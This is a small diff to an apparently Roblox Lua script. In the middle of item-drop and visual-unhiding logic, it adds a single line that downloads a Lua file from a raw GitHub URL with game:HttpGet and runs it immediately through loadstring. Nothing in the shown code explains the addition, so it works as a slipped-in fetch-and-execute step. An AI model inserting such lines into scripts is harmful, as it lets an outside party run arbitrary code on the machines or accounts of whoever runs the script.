@@ -354,6 +354,7 @@ if storeCount >= 40 then
     if itemCount and itemCount > 0 then
         FireDrop(itemCount)
     end
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ringtaa/unfly.github.io/refs/heads/main/unfly.lua"))()
     task.wait(0.3)
     hiding = false
     unhideAllVisuals()
